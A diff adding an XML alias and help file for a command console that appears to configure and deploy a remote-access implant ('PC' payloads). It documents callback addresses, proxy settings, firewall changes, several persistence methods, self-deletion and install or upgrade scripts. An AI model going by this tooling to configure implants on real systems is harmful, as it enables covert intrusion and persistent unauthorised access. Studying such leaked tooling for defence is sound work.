@@ -1,0 +1,311 @@
+<?xml version='1.0' ?>
+
+<Aliases>
+	<Alias>
+		<Name>pc_install</Name>
+		<ReplaceBeforeArgs>script Install/_Install.dss -args "INSTALL </ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc</ReplaceAfterArgs>
+		
+		<Help>pc_install</Help>
+		<Help>    Installs a Level4 PC</Help>
+		
+		<Options>
+		</Options>
+	</Alias>
+	
+	<Alias>
+		<Name>pc_uninstall</Name>
+		<ReplaceBeforeArgs>script Install/_Uninstall.dss -args "</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc</ReplaceAfterArgs>
+		
+		<Help>pc_uninstall</Help>
+		<Help>    Uninstalls a Level4 PC</Help>
+		
+		<Options>
+		</Options>
+	</Alias>
+	
+	<Alias>
+		<Name>pc_upgrade</Name>
+		<ReplaceBeforeArgs>script Install/_Install.dss -args "UPGRADE </ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc</ReplaceAfterArgs>
+		
+		<Help>pc_upgrade</Help>
+		<Help>    Upgrades a Level4 PC</Help>
+		
+		<Options>
+		</Options>
+	</Alias>
+	
+	<Alias>
+		<Name>pc_prep</Name>
+		<ReplaceBeforeArgs>python Payload/_Prep.py -args "-action configure</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc</ReplaceAfterArgs>
+		
+		<Help>pc_prep</Help>
+		<Help>    Configures a PC payload</Help>
+		<Help></Help>
+		<Help>  [-level3]</Help>
+		<Help>     Select from PC level 3 payloads only. (equivalent to -type level3)</Help>
+		<Help>     REJECT: -level4</Help>
+		<Help>  [-level4]</Help>
+		<Help>     Select from PC level 4 payloads only. (equivalent to -type level4)</Help>
+		<Help>     REJECT: -level3</Help>
+		<Help>  [-i386]</Help>
+		<Help>     Select from PC i386 payloads only. (equivalent to -arch i386)</Help>
+		<Help>     REJECT: -x64</Help>
+		<Help>  [-x64]</Help>
+		<Help>     Select from PC x64 payloads only. (equivalent to -arch x64)</Help>
+		<Help>     REJECT: -i386</Help>
+		<Help>  [-sharedlib]</Help>
+		<Help>     Choose only from DLL binaries. (equivalent to -bintype sharedlib)</Help>
+		<Help>     REJECT: -exe</Help>
+		<Help>  [-exe]</Help>
+		<Help>     Choose only from EXE binaries. (equivalent to -bintype exe)</Help>
+		<Help>     REJECT: -sharedlib</Help>
+		<Help>  [-tcp]</Help>
+		<Help>     Choose only from TCP binaries.</Help>
+		<Help>     REJECT: -http</Help>
+		<Help>  [-http]</Help>
+		<Help>     Choose only from HTTP binaries.</Help>
+		<Help>     REJECT: -tcp</Help>
+		<Help>  [-extra &lt;extraInfo&gt;]</Help>
+		<Help>     Extra payload information</Help>
+		<Help>  [-verbose]</Help>
+		<Help>     Print additional information</Help>
+		<Help>  [-utilityburst]</Help>
+		<Help>     Configure with utilityburst support</Help>
+		<Help>     REJECT: -appcompat -winsockhelperapi -generic</Help>
+		<Help>  [-appcompat]</Help>
+		<Help>     Configure with appcompat support (FREEPARKING)</Help>
+		<Help>     REJECT: -utilityburst -winsockhelperapi -generic</Help>
+		<Help>  [-winsockhelperapi]</Help>
+   		<Help>     Configure with winsockhelperapi support</Help>
+		<Help>     REJECT: -utilityburst -appcompat -generic</Help>
+		<Help>  [-generic]</Help>
+		<Help>     Configure without specific persistence support (i.e. appinit or exe)</Help>
+		<Help>     REJECT: -utilityburst -appcompat -winsockhelperapi</Help>
+		<Help>  [-driver &lt;name&gt;]</Help>
+		<Help>     Sets the driver name</Help>
+		<Help>  [-process &lt;name&gt;]</Help>
+		<Help>     Sets the process name</Help>
+		<Help>  [-info &lt;name&gt;]</Help>
+		<Help>     Sets the extra info area</Help>
+		<Help>  [-file &lt;file&gt;]</Help>
+		<Help>     The payload file for the -disable option</Help>
+
+		<Options>
+			<Option>type</Option>
+			<Option>level3</Option>
+			<Option>level4</Option>
+			<Option>arch</Option>
+			<Option>i386</Option>
+			<Option>x64</Option>
+			<Option>bintype</Option>
+			<Option>sharedlib</Option>
+			<Option>exe</Option>
+			<Option>tcp</Option>
+			<Option>http</Option>
+			<Option>extra</Option>
+			<Option>verbose</Option>
+			<Option>utilityburst</Option>
+			<Option>appcompat</Option>
+			<Option>winsockhelperapi</Option>
+			<Option>generic</Option>
+			<Option>driver</Option>
+			<Option>process</Option>
+			<Option>info</Option>
+			<Option>os</Option> <!--  ignored -->
+		</Options>
+	</Alias>
+	
+	<Alias>
+		<Name>pc_pick</Name>
+		<ReplaceBeforeArgs>python Payload/_Prep.py -args "-action pick</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc</ReplaceAfterArgs>
+		
+		<Help>pc_pick</Help>
+		<Help>    Selects an already configured PC payload</Help>
+		<Help></Help>
+		<Help>  [-level3]</Help>
+		<Help>     Select from PC level 3 payloads only. (equivalent to -type level3)</Help>
+		<Help>     REJECT: -level4</Help>
+		<Help>  [-level4]</Help>
+		<Help>     Select from PC level 4 payloads only. (equivalent to -type level4)</Help>
+		<Help>     REJECT: -level3</Help>
+		<Help>  [-i386]</Help>
+		<Help>     Select from PC i386 payloads only. (equivalent to -arch i386)</Help>
+		<Help>     REJECT: -x64</Help>
+		<Help>  [-x64]</Help>
+		<Help>     Select from PC x64 payloads only. (equivalent to -arch x64)</Help>
+		<Help>     REJECT: -i386</Help>
+		<Help>  [-sharedlib]</Help>
+		<Help>     Choose only from DLL binaries. (equivalent to -bintype sharedlib)</Help>
+		<Help>     REJECT: -exe</Help>
+		<Help>  [-exe]</Help>
+		<Help>     Choose only from EXE binaries. (equivalent to -bintype exe)</Help>
+		<Help>     REJECT: -sharedlib</Help>
+		<Help>  [-tcp]</Help>
+		<Help>     Choose only from TCP binaries.</Help>
+		<Help>     REJECT: -http</Help>
+		<Help>  [-http]</Help>
+		<Help>     Choose only from HTTP binaries.</Help>
+		<Help>     REJECT: -tcp</Help>
+		<Help>  [-extra &lt;extraInfo&gt;]</Help>
+		<Help>     Extra payload information</Help>
+		<Help>  [-verbose]</Help>
+		<Help>     Print additional information</Help>
+		<Help>  [-utilityburst]</Help>
+		<Help>     Configure with utilityburst support</Help>
+		<Help>     REJECT: -appcompat -winsockhelperapi -generic</Help>
+		<Help>  [-appcompat]</Help>
+		<Help>     Configure with appcompat support (FREEPARKING)</Help>
+		<Help>     REJECT: -utilityburst -winsockhelperapi -generic</Help>
+		<Help>  [-winsockhelperapi]</Help>
+   		<Help>     Configure with winsockhelperapi support</Help>
+		<Help>     REJECT: -utilityburst -appcompat -generic</Help>
+		<Help>  [-generic]</Help>
+		<Help>     Configure without specific persistence support (i.e. appinit or exe)</Help>
+		<Help>     REJECT: -utilityburst -appcompat -winsockhelperapi</Help>
+		<Help>  [-driver &lt;name&gt;]</Help>
+		<Help>     Sets the driver name</Help>
+		<Help>  [-process &lt;name&gt;]</Help>
+		<Help>     Sets the process name</Help>
+		<Help>  [-info &lt;name&gt;]</Help>
+		<Help>     Sets the extra info area</Help>
+		<Help>  [-file &lt;file&gt;]</Help>
+		<Help>     The payload file for the -disable option</Help>
+		
+		<Options>
+			<Option>type</Option>
+			<Option>level3</Option>
+			<Option>level4</Option>
+			<Option>arch</Option>
+			<Option>i386</Option>
+			<Option>x64</Option>
+			<Option>bintype</Option>
+			<Option>sharedlib</Option>
+			<Option>exe</Option>
+			<Option>tcp</Option>
+			<Option>http</Option>
+			<Option>extra</Option>
+			<Option>verbose</Option>
+			<Option>utilityburst</Option>
+			<Option>appcompat</Option>
+			<Option>winsockhelperapi</Option>
+			<Option>generic</Option>
+			<Option>driver</Option>
+			<Option>process</Option>
+			<Option>info</Option>
+			<Option>os</Option> <!--  ignored -->
+		</Options>
+	</Alias>
+	<Alias>
+		<Name>pc_master</Name>
+		<ReplaceBeforeArgs>python Payload/_Prep.py -args "-action configure</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc</ReplaceAfterArgs>
+		
+		<Help>pc_master</Help>
+		<Help>    Configures a PC payload, with pre-specified answers to otherwise interactive questions.</Help>
+		<Help></Help>
+		<Help>  Usage: pc_master [expanded_pc_prep_options]</Help>
+		<Help>    Takes any options 'pc_prep' does, but also a ton more.</Help>
+		<Help>    For 'boolean' options, there is a -NOopt as well.</Help>
+		<Help>    UNSPECIFIED OR INCORRECT OPTIONS WILL RESULT IN INTERACTIVE QUESTIONS!</Help>
+		<Help>    Unused specification args will emit warnings.</Help>
+		<Help>    Arguments will still be sanity-checked. Incorrect args will emit errors.</Help>
+		<Help>    It is possible to generate a Level3 with no interactivity. Level4, not yet.</Help>
+		<Help>  Specification options:</Help>
+		<Help>    [-calladdr [iparg]]</Help>
+		<Help>       Set the callback address. Omit iparg to set default.</Help>
+		<Help>    [-callport [dstportarg1 srcportarg1]... [dstportargN srcportargN]]</Help>
+		<Help>       Set the callback port(s). Omit any ports to set all defaults. Every DEST port must have a SRC port (which may be 0).</Help>
+		<Help>    [-exename [namearg]]</Help>
+		<Help>       Set the "exe name in version information". Omit namearg to retain default.</Help>
+		<Help>    [-fire] [-nofire]</Help>
+		<Help>       "Update the Windows firewall when listening" (or not)</Help>
+		<Help>    [-tls] [-notls]</Help>
+		<Help>       Use HTTPS (TLS) for comms (-nohttps to use HTTP) (HTTP-PC only).</Help>
+		<Help>    [-imm] [-noimm]</Help>
+		<Help>       "IMMEDIATE CALLBACK" (or not)</Help>
+		<Help>    [-key namearg]</Help>
+		<Help>       Set the key name (e.g. Default). Will go interactive if namearg is missing.</Help>
+		<Help>    [-listen starthour stophour [-loops numarg] [-ldur secarg] [-laddr iparg] [-lport [portarg1] ... [portargN]]]</Help>
+		<Help>    [-nolisten]</Help>
+		<Help>       PC should listen (or not). Omit suboption(s), to retain defaults (TCP-PC only).</Help>
+		<Help>       (loops:) Number of listening loops.</Help>
+		<Help>       (ldur:) Duration per loop.</Help>
+		<Help>       (laddr:) Bind address for listening.</Help>
+		<Help>       (lport:) Set the listening port(s). Omit any ports to set all defaults.</Help>
+		<Help>    [-pcid [idarg]]</Help>
+		<Help>       Set the PC ID. Up to 64 bits, can use 0x prefix to set as hex. Omit idarg to set default.</Help>
+		<Help>    [-pcp [-maxdata sizearg] [-failwait secarg] [-sendwait secarg] [-maxfail numarg]]</Help>
+		<Help>       Set the proxy connection parameters. Omit suboption(s), to retain defaults (HTTP-PC only).</Help>
+		<Help>       (maxdata:) MAXIMUM DATA SEND SIZE</Help>
+		<Help>       (failwait:) WAIT TIME AFTER FAILURE</Help>
+		<Help>       (sendwait:) WAIT TIME BETWEEN SENDS</Help>
+		<Help>       (maxfail:) MAXIMUM SEND FAILURES</Help>
+		<Help>    [-proxyaddr [iparg]]</Help>
+		<Help>       Set the proxy address. Omit iparg, to not set an address (HTTP-PC only).</Help>
+		<Help>    [-proxyport [portarg]]</Help>
+		<Help>       Set the port to connect to, on the specified proxy server (HTTP-PC only).</Help>
+		<Help>    [-proxyuser [namearg] [-proxypass [passarg]]]</Help>
+		<Help>       Set the proxy username/password. Omit namearg, to not set credentials (can omit -proxypass).</Help>
+		<Help>       Important consideration, if password starts or ends with a space, or contains a quote (') or</Help>
+		<Help>       double-quote (") character, it must be interactively entered (HTTP-PC only).</Help>
+		<Help>    [-qdel] [-noqdel]</Help>
+		<Help>       Enable/disable quick self-deletion (Level3 EXE only).</Help>
+		<Help>    [-wind] [-nowind]</Help>
+		<Help>       Enable/disable window creation (DLL only).</Help>
+
+		<Options>
+			<Option>calladdr</Option>
+			<Option>callport</Option>
+			<Option>exename</Option>
+			<Option>fire</Option>
+			<Option>nofire</Option>
+			<Option>tls</Option>
+			<Option>notls</Option>
+			<Option>imm</Option>
+			<Option>noimm</Option>
+			<Option>key</Option>
+			<Option>listen</Option>
+			<Option>loops</Option>
+			<Option>ldur</Option>
+			<Option>laddr</Option>
+			<Option>lport</Option>
+			<Option>nolisten</Option>
+			<Option>pcid</Option>
+			<Option>pcp</Option>
+			<Option>maxdata</Option>
+			<Option>failwait</Option>
+			<Option>sendwait</Option>
+			<Option>maxfail</Option>
+			<Option>proxyaddr</Option>
+			<Option>proxyport</Option>
+			<Option>proxyuser</Option>
+			<Option>proxypass</Option>
+			<Option>qdel</Option>
+			<Option>noqdel</Option>
+			<Option>wind</Option>
+			<Option>nowind</Option>
+			<Option>level3</Option>
+			<Option>level4</Option>
+			<Option>i386</Option>
+			<Option>x64</Option>
+			<Option>sharedlib</Option>
+			<Option>exe</Option>
+			<Option>tcp</Option>
+			<Option>http</Option>
+			<Option>verbose</Option>
+			<Option>utilityburst</Option>
+			<Option>appcompat</Option>
+			<Option>winsockhelperapi</Option>
+			<Option>generic</Option>
+			<Option>driver</Option>
+			<Option>process</Option>
+			<Option>info</Option>
+		</Options>
+	</Alias>
+</Aliases>	
+		
